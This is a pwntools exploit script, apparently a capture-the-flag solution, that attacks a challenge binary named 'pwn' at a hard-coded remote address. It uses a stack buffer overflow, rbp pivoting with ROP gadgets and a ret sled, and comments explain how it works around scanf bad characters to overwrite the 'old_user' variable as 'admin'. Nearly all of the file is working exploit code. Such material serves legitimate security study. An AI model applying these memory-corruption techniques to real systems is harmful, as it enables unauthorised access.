#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./pwn", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 139.180.137.100 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


old_user = elf.symbols["old_user"]

env = {}
io = start()

io.sendline(b"2")
io.sendline(b"a")
io.sendline(b"b")

# scanf bad char (in hex): 09, 0a, 0b, 0c, 0d, 20
# impact: unable to return to `getflag`, `Signup`, `main`

io.sendline(b"2")
payload = b"admin".ljust(0x40, b"\x00")
payload += flat(
    elf.bss(0x800),           # overwrite saved rbp
    0x00400788,               # pop rbp; ret;
    old_user + 0x40,          # value for `pop rbp`
    elf.symbols["Login"] + 4  # skip function prologue (to retain modified rbp)
)

# since `rbp` is now pointing to `old_user + 0x40`, when `scanf` is called with
# `[rbp-0x40]` as the input buffer, it would write to `old_user`
io.sendlineafter(b"username:\n", payload[:-1])


payload = b"admin".ljust(0x40, b"\x00")
payload += flat(0)  # padding

# bunch of `ret;` to increase `rsp` value
# otherwise when calling main again, `rsp` value would decrease until it
# reaches non-writable memory space which causes segfault
for i in range(0x1c0):
    payload += flat(0x400789)  # ret;

# we could not return directly to main since the function address contains
# bad char
# since we could not jump to _start directly (it ends with 0x20, bad char)
# and the instruction that we skip is `xor ebp, ebp`, which zeroes out `rbp`,
# we do the same by popping 0 into `rbp`
payload += flat(
    0x400788,  # pop rbp; ret;
    0,         # value for `pop rbp`
    0x400722,  # _start + 2
)
io.sendline(payload)
io.sendline(b"4")

io.interactive()
